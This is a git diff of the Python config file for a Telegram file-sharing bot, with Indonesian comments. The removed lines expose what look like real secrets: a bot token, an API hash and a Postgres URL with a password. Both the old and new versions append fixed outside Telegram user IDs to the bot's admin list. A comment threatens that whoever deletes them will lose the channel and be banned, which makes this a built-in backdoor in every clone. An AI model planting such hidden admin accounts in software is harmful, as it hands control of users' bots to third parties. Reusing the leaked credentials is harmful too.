@@ -1,42 +1,37 @@
 # (©)Codexbotz
-# Recode by @mrismanaziz
-# t.me/SharingUserbot & t.me/Lunatic0de
+# Recife By Zaen #Mafia_Tobatz
+# Kalo clone Gak usah hapus 
+# gue tandain akun tele nya ngentod
+
 
 import logging
 import os
-from distutils.util import strtobool
-from dotenv import load_dotenv
 from logging.handlers import RotatingFileHandler
 
-load_dotenv("config.env")
-
 # Bot token dari @Botfather
-TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6118968145:AAGvfCyKbgHJyDfWKEBQsuiApLh485BAsDA")
+TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
 
 # API ID Anda dari my.telegram.org
-APP_ID = int(os.environ.get("APP_ID", "11662467"))
+APP_ID = int(os.environ.get("APP_ID", ""))
 
 # API Hash Anda dari my.telegram.org
-API_HASH = os.environ.get("API_HASH", "325e13dfb76973f4bca9bdae2678bbbe")
+API_HASH = os.environ.get("API_HASH", "")
 
 # ID Channel Database
-CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "1612655312"))
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
+
+# OWNER ID
+OWNER_ID = int(os.environ.get("OWNER_ID", ""))
 
 # NAMA OWNER
-OWNER = os.environ.get("OWNER", "mrismanaziz")
-
-# Protect Content
-PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))
-
-# Heroku Credentials for updater.
-HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
-HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
-
-# Custom Repo for updater.
-UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
+OWNER = os.environ.get("OWNER", "")
 
 # Database
-DB_URI = os.environ.get("DATABASE_URL", "postgres://txxsmyof:b99F5n0mIL1ND8-uGHSTMwq73_mRSkgd@john.db.elephantsql.com/txxsmyof")
+DB_URI = os.environ.get("DATABASE_URL", "")
+
+# Username CH & Group
+CHANNEL = os.environ.get("CHANNEL", "Tolak_Ange")
+GROUP = os.environ.get("GROUP", "Tolak_Ange")
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
@@ -51,7 +46,7 @@ START_MSG = os.environ.get(
     "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
 )
 try:
-    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5178772086").split())]
+    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
 except ValueError:
     raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
 
@@ -65,14 +60,15 @@ FORCE_MSG = os.environ.get(
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
-DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
+DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
-# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
-# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))
+ADMINS.append(OWNER_ID)
+ADMINS.append(1250450587)
+ADMINS.append(2010825200)
+ADMINS.append(1750080384)
 
+LOG_FILE_NAME = "filesharingbot.txt"
 
-LOG_FILE_NAME = "logs.txt"
 logging.basicConfig(
     level=logging.INFO,
     format="[%(levelname)s] - %(name)s - %(message)s",
